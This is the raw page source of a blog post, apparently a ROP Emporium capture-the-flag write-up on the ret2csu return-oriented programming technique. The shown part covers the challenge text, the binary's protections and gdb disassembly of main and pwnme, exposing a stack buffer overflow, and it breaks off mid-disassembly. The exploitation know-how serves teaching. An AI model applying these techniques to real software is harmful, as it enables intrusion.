0 0 2-2V8.118z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://github.com/thuri10"><span class="sr-only">github</span><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 hover:text-blue-500 dark:text-gray-200 dark:hover:text-blue-400 h-6 w-6"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://twitter.com/0xhexski"><span class="sr-only">twitter</span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="fill-current text-gray-700 hover:text-blue-500 dark:text-gray-200 dark:hover:text-blue-400 h-6 w-6"><path d="M23.953 4.57a10 10 0 0 1-2.825.775 4.958 4.958 0 0 0 2.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 0 0-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 0 0-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 0 1-2.228-.616v.06a4.923 4.923 0 0 0 3.946 4.827 4.996 4.996 0 0 1-2.212.085 4.936 4.936 0 0 0 4.604 3.417 9.867 9.867 0 0 1-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 0 0 7.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0 0 24 4.59z"></path></svg></a></div><div class="mb-2 flex space-x-2 text-sm text-gray-500 dark:text-gray-400"><div>Thuri10</div><div> • </div><div>© 2022</div><div> • </div><a href="/">Solar Bits</a></div><div class="mb-8 text-sm text-gray-500 dark:text-gray-400"><a target="_blank" rel="noopener noreferrer" href="https://github.com/timlrx/tailwind-nextjs-starter-blog">Tailwind Nextjs Theme</a></div></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"mdxSource":"var Component=(()=\u003e{var p=Object.create;var c=Object.defineProperty;var m=Object.getOwnPropertyDescriptor;var h=Object.getOwnPropertyNames;var N=Object.getPrototypeOf,k=Object.prototype.hasOwnProperty;var o=n=\u003ec(n,\"__esModule\",{value:!0});var u=(n,s)=\u003e()=\u003e(s||n((s={exports:{}}).exports,s),s.exports),b=(n,s)=\u003e{for(var r in s)c(n,r,{get:s[r],enumerable:!0})},t=(n,s,r,a)=\u003e{if(s\u0026\u0026typeof s==\"object\"||typeof s==\"function\")for(let l of h(s))!k.call(n,l)\u0026\u0026(r||l!==\"default\")\u0026\u0026c(n,l,{get:()=\u003es[l],enumerable:!(a=m(s,l))||a.enumerable});return n},g=(n,s)=\u003et(o(c(n!=null?p(N(n)):{},\"default\",!s\u0026\u0026n\u0026\u0026n.__esModule?{get:()=\u003en.default,enumerable:!0}:{value:n,enumerable:!0})),n),x=(n=\u003e(s,r)=\u003en\u0026\u0026n.get(s)||(r=t(o({}),s,1),n\u0026\u0026n.set(s,r),r))(typeof WeakMap!=\"undefined\"?new WeakMap:0);var d=u((q,i)=\u003e{i.exports=_jsx_runtime});var y={};b(y,{default:()=\u003ew,frontmatter:()=\u003ev});var e=g(d()),v={title:\"Return-Oriented Programming - Ret2csu\",date:\"2021-12-20\",tags:[\"ropemporium\",\"rop\",\"pwn\"],draft:!1,summary:\"Learn a ROP technique that lets you populate useful calling convention registers like rdi, rsi and rdx even in an environment where gadgets are sparse.\",image:[],layout:\"PostLayout\",canonicalUrl:null};function f(n={}){let{wrapper:s}=n.components||{};return s?(0,e.jsx)(s,Object.assign({},n,{children:(0,e.jsx)(r,{})})):r();function r(){let a=Object.assign({h1:\"h1\",a:\"a\",span:\"span\",p:\"p\",blockquote:\"blockquote\",strong:\"strong\",pre:\"pre\",code:\"code\",h2:\"h2\",div:\"div\",ol:\"ol\",li:\"li\"},n.components),{Image:l}=a;return l||_(\"Image\",!0),(0,e.jsxs)(e.Fragment,{children:[(0,e.jsxs)(a.h1,{id:\"introduction\",children:[(0,e.jsx)(a.a,{href:\"#introduction\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(a.span,{className:\"icon icon-link\"})}),\"Introduction\"]}),(0,e.jsx)(a.p,{children:\"Challenge description\"}),(0,e.jsx)(a.blockquote,{children:(0,e.jsxs)(a.p,{children:[\"We're back in ret2win territory, but this time with no useful gadgets.How will we populate critical registers without them? The goal of this level is understanding of universal rop techniques due to to the limited gadgets available in the binary as compared to the ret2win challenge. The binary can be downloaded from authors website \",(0,e.jsx)(a.a,{href:\"https://ropemporium.com\",children:\"Ropemporium\"})]})}),(0,e.jsxs)(a.p,{children:[\"After downloading the binary, check the enabled protections and mitigation's. Only \",(0,e.jsx)(a.strong,{children:\"NX\"}),\" and Partial RELRO protections are turned on as shown below.\"]}),(0,e.jsx)(a.pre,{className:\"language-bash\",children:(0,e.jsxs)(a.code,{className:\"code-highlight language-bash\",children:[(0,e.jsx)(a.span,{className:\"code-line\",children:`    Arch:     amd64-64-little\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`    RELRO:    Partial RELRO\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`    Stack:    No canary found\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`    NX:       NX enabled\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"    PIE:      No PIE \",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"0x400000\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),(0,e.jsxs)(a.p,{children:[\"First step is to find the vulnerability in the binary that will enable us to subvert the program execution control flow. From the disassembly of the main function we are only calling \",(0,e.jsx)(a.strong,{children:\"pwnme\"}),\" function.\"]}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsx)(a.span,{className:\"code-line\",children:`(gdb) disas main\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`Dump of assembler code for function main:\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400607\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tpush   \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400608\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsp\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000040060b\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"4\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x400500\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"pwnme@plt\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400610\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"9\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"eax\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400615\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"14\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400616\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"15\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),`:\tret    \n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`End of assembler dump.\n`})]})}),(0,e.jsxs)(a.p,{children:[\"The function reference the got table in order to load the actual address of pwnme function from \",(0,e.jsx)(a.strong,{children:\"libret2csu.so\"}),\" library after the first call.\"]}),(0,e.jsxs)(a.h2,{id:\"pwnme-function-disassembly\",children:[(0,e.jsx)(a.a,{href:\"#pwnme-function-disassembly\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(a.span,{className:\"icon icon-link\"})}),\"pwnme Function Disassembly\"]}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsx)(a.span,{className:\"code-line\",children:`(gdb) disas pwnme\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`Dump of assembler code for function pwnme:\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000093a\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tpush   \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000093b\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsp\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000093e\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"4\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tsub    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsp\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x20\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000000942\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"8\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),\",QWORD PTR \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x201697\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),\"        # \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x201fe0\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000000949\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"15\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),\",QWORD PTR \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000094c\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"18\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"ecx\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000000951\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"23\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"edx\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x2\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000000956\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"28\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"esi\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000095b\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"33\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000095e\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"36\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x820\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"setvbuf@plt\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000000963\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tlea    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x31e\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),\"        # \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xc88\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000096a\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"48\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x7a0\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"puts@plt\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000096f\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"53\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tlea    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x32a\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),\"        # \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xca0\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000000976\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"60\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x7a0\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"puts@plt\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000097b\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"65\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tlea    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),\",\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x20\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000097f\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"69\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"edx\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x20\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000000984\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"74\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"esi\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000000989\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"79\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000098c\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"82\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x7d0\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"memset@plt\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000000991\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"87\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tlea    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x310\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),\"        # \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xca8\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000000998\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"94\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x7a0\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"puts@plt\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000099d\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"99\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tlea    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x36e\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),\"        # \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xd12\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009a4\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"106\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"eax\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009a9\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"111\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x7c0\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),\"printf@plt\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009ae\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"116\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tlea    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),\",\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x20\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009b2\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"120\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"edx\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x200\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009b7\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(a.span,{className:\"token 